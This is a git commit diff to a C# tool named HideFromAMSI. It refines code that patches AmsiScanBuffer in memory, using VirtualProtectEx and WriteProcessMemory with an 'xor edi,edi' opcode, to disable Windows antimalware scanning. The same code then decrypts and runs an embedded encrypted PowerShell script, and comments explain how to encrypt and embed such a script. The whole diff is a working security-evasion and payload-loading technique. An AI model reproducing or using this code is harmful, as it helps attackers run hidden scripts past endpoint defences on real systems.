22d8df59907dda5c9211a94b739510dcf0252f1f
Oriel Cochavi <oriel1987@gmail.com>
2018-12-17 23:34:54 +0200

    Improved the Hooking function. added some comments.

--- HideFromAMSI/Program.cs
+++ HideFromAMSI/Program.cs
@@ -10,7 +10,7 @@ namespace HideFromAMSI
 {
     class Program
     {
-        public static string EncryptedPs1Script = "The encrypted script"; //Use the Encrypt(string plainText) to get the encrypted ps1 script.
+        public static string EncryptedPs1Script = "The encrypted script from the enc.txt you create in the main function"; //Use the Encrypt(string plainText) to get the encrypted ps1 script.
 
         static readonly string PasswordHash = "OyC@P@@Sw0rd";
         static readonly string SaltKey = "OyC@S@LT&KEY";
@@ -58,6 +58,7 @@ namespace HideFromAMSI
             return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount).TrimEnd("\0".ToCharArray());
         }
 
+        // Signatures from https://pinvoke.net/
         static class NativeMethods
         {
             [DllImport("kernel32.dll")]
@@ -77,6 +78,9 @@ namespace HideFromAMSI
 
             [DllImport("kernel32.dll")]
             public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
             public enum Protection : uint
             {
@@ -100,7 +104,7 @@ namespace HideFromAMSI
             public static extern IntPtr GetCurrentProcess();
         }
 
-        static string HookAmsiScanBuffer()
+        static string HookAmsiScanBuffer(IntPtr hProcess)
         {
             IntPtr dllHandle = NativeMethods.LoadLibrary("amsi.dll"); //load the amsi.dll
             if (dllHandle == null) return "LoadLibrary error " + NativeMethods.GetLastError();
@@ -114,19 +118,27 @@ namespace HideFromAMSI
             uint OldProtection;
 
             //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
-            bool VirtualProtectRc = NativeMethods.VirtualProtectEx(NativeMethods.GetCurrentProcess(), AmsiScanbufferAddr, (UIntPtr)0x0015,
+            bool VirtualProtectRc = NativeMethods.VirtualProtectEx(hProcess, AmsiScanbufferAddr, (UIntPtr)0x0015,
                 (uint)NativeMethods.Protection.PAGE_EXECUTE_READWRITE, out OldProtection);
-            if (VirtualProtectRc == false) return "VirtualProtectEx error " + NativeMethods.GetLastError();
+            if (VirtualProtectRc == false) return "VirtualProtectEx error [change protection] " + NativeMethods.GetLastError();
 
             //The new patch opcode
             var patch = new byte[] { 0x31, 0xff, 0x90 };
 
             //Setting a pointer to the patch opcode array (unmanagedPointer)
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-            Marshal.Copy(patch, 0, unmanagedPointer, 3);
+            //IntPtr unmanagedPointer = Marshal.AllocHGlobal(3); // For MoveMemory
+            //Marshal.Copy(patch, 0, unmanagedPointer, 3);       // For MoveMemory
 
             //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
-            NativeMethods.MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
+            //NativeMethods.MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
+            IntPtr lpNumberOfBytesWritten;
+            NativeMethods.WriteProcessMemory(hProcess, AmsiScanbufferAddr + 0x001b, patch, 3, out lpNumberOfBytesWritten);
+            if (3 != (long)lpNumberOfBytesWritten) return "WriteProcessMemory error " + NativeMethods.GetLastError();
+
+            //Pointer changing the AmsiScanBuffer memory protection back to readable only
+            VirtualProtectRc = NativeMethods.VirtualProtectEx(hProcess, AmsiScanbufferAddr, (UIntPtr)0x0015,
+                OldProtection, out OldProtection);
+            if (VirtualProtectRc == false) return "VirtualProtectEx error [restore protection] " + NativeMethods.GetLastError();
 
             return "AmsiScanBuffer hooked successfully";
         }
@@ -158,14 +170,13 @@ namespace HideFromAMSI
             }
         }
 
-        static void RunPowerShell()
+        static void RunAutomationPowerShell()
         {
             using (PowerShell PowerShellInstance = PowerShell.Create())
             {
-                Console.Out.WriteLine(HookAmsiScanBuffer());
+                Console.Out.WriteLine(HookAmsiScanBuffer(NativeMethods.GetCurrentProcess()));
 
-                string DecryptedPs1Script = Encoding.UTF8.GetString(Convert.FromBase64String(Decrypt(EncryptedPs1Script)));
-
+                string DecryptedPs1Script = Encoding.UTF8.GetString(Convert.FromBase64String(Decrypt(EncryptedPs1Script))); // Could be Unicode instead of UTF8 [Encoding.UTF8. => Encoding.Unicode.]
                 RunspaceInvoke invoke = new RunspaceInvoke();
                 ScriptBlock Ps1ScriptBlock = invoke.Invoke(DecryptedPs1Script)[0].BaseObject as ScriptBlock;
 
@@ -182,7 +193,20 @@ namespace HideFromAMSI
 
         static void Main(string[] args)
         {
-            RunPowerShell();
+            /*
+             * 1. Encrypt your script. (The script should be encoded to Base64 to avoid problems)
+             *    This code will save a file "enc.txt" in the same folder as the executable, copy it's content 
+             *    and place it as the global EncryptedPs1Script string value
+             *    (public static string EncryptedPs1Script = "The encrypted script";).
+             */
+            /*string EncryptedScript = Encrypt("The Base64 of the script");
+            using (System.IO.StreamWriter file =
+                    new System.IO.StreamWriter("enc.txt", false))
+            {
+                file.WriteLine(EncryptedScript);
+            }*/
+
+            RunAutomationPowerShell();
             // NativeMethods.GetModuleHandle(null); -> NOT WORKING - WHY?
         }
     }
